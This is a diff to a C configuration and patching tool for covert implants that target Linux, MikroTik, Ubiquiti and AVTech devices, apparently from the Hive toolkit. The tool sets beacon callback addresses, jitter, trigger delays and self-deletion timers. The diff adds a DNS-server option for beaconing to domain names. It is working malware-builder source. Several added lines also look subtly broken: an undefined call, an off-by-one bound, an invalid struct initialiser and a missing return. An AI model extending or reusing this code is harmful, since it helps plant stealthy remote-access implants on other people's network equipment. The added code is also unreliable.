@@ -68,6 +68,7 @@ struct cl_args {
 	unsigned int 	beacon_port;
 	unsigned int 	host_len;
 	char 			beacon_ip[256];
+	char			dns_ip[16];
 	char			iface[16];
 	unsigned char	idKey[ID_KEY_HASH_SIZE];
 	unsigned long	init_delay;
@@ -126,9 +127,9 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
-//	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
 	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
+	fprintf(stdout, "    %s-S <address>%s       - IP address the DNS server (required if beacon address a is domain name\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
@@ -171,28 +172,30 @@ int RandFill(char *buf, int size)
 int main(int argc, char **argv)
 {
 	int optval;
-	int linux_x86 = 0;							// Linux x86
-//	int solaris_x86 = 0;						// Solaris x86
-	int mikrotik_x86 = 0;						// MikroTik x86
-	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
-//	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
-	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
-	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
-	int avtech_arm = 0;							// AVTech ARM
-	int raw = 0;								// unpatched versions
-	char *host = (char *) NULL;					// cached hostname for user confirmation message
-	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
-	time_t currentTime;							// Time stamp for ID key generation
-	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
-	unsigned char implantKey[ID_KEY_HASH_SIZE];
-	unsigned char triggerKey[ID_KEY_HASH_SIZE];
-	boolean keyed = FALSE;						// Boolean to verify that a key was entered
+	int linux_x86 = 0;			// Linux x86
+//	int solaris_x86 = 0;		// Solaris x86
+	int mikrotik_x86 = 0;		// MikroTik x86
+	int mikrotik_mips = 0;		// MikroTik MIPS Big Endian
+//	int mikrotik_mipsel = 0;	// MikroTik MIPS Little Endian
+	int mikrotik_ppc = 0;		// MikroTik PowerPC [Big Endian]
+	int ubiquiti_mips = 0;		// Ubiquiti MIPS Big Endian
+	int avtech_arm = 0;			// AVTech ARM
+	int raw = 0;				// unpatched versions
+
+	char 				*host = (char *) NULL;			// cached hostname for user confirmation message
+	FILE 				*implantIDFile;					// Used to save implant keys and subsequent sha1 hashes...
+	time_t 				currentTime;					// Time stamp for ID key generation
+	struct tm 			*idKeyTime;						// Pointer to the ID key generation data structure
+	unsigned char 		implantKey[ID_KEY_HASH_SIZE];
+	unsigned char 		triggerKey[ID_KEY_HASH_SIZE];
+	char				dns_ip[16] = {0};
+	boolean 			keyed = FALSE;					// Boolean to verify that a key was entered
 
 	args.sig = SIG_HEAD;
 
 	implantKey[0] = '\0';
 
-	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:s:t:")) != -1) {
+	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:S:s:t:")) != -1) {
 		switch (optval) {
 
 		case 'a':	// Hostname / IP address of beacon LP
@@ -200,13 +203,7 @@ int main(int argc, char **argv)
 				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
 				return -1;
 			}
-/*
-			if ( inet_aton( optarg, &addr_check ) == 0 )
-			{
-			    printf( " ERROR: invalid IP address specified\n" );
-			    return -1;
-			}
-*/
+
 			// save pointer to the unmodified user input.  this is echo'd back to user
 			host = optarg;
 
@@ -228,18 +225,6 @@ int main(int argc, char **argv)
 		case 'h':	// Help
 			usage(argv);
 			break;
-
-#if 0	// Solairis (deprecated)
-		case 'I':	// interface to listen for triggers. only needed for solaris
-			if (strlen(optarg) > sizeof(args.iface)) {
-				printf(" ERROR: Name of interface is too long\n");
-				return -1;
-			}
-			// copy string representation of interface name into patched structure
-			memcpy(args.iface, optarg, strlen(optarg));
-
-			break;
-#endif
 
 		case 'i':	// beacon interval
 			args.interval = (unsigned int) atoi(optarg) * 1000;
@@ -387,6 +372,18 @@ int main(int argc, char **argv)
 			}
 			break;
 
+		case 'S':
+			{
+			char *address;
+			address = asloc(optarg);
+			if (strlen(address) > 16) {
+				fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
+				return -1;
+			}
+			strncpy(dns_ip, address, sizeof(dns_ip));
+			break;
+			}
+
 		case 's':	// self delete delay
 			args.delete_delay = strtoul(optarg, NULL, 10);
 			break;
@@ -406,6 +403,13 @@ int main(int argc, char **argv)
 		printf("\n    %sERROR: Key missing%s\n ", RED, RESET);
 		usage(argv);
 		return -1;
+	}
+
+	{
+		struct in_addr	beaconIPaddr = 0;
+		if (strlen(dns_ip) == 0 && inet_pton(AF_INET, args.beacon_ip, &beaconIPaddr) == 0) {
+			printf("%sError: The beacon address is invalid, or no DNS server address was specified.%s\n", RED, RESET);
+		}
 	}
 
 	if (raw == 0) {
@@ -518,6 +522,7 @@ int main(int argc, char **argv)
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
 		cl_string((unsigned char *) args.iface, sizeof(args.iface));
 		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
+		cl_string((unsigned char *) args.dns_ip, sizeof(args.dns_ip));
 	}
 
 //	remove(HIVE_SOLARIS_X86_FILE);
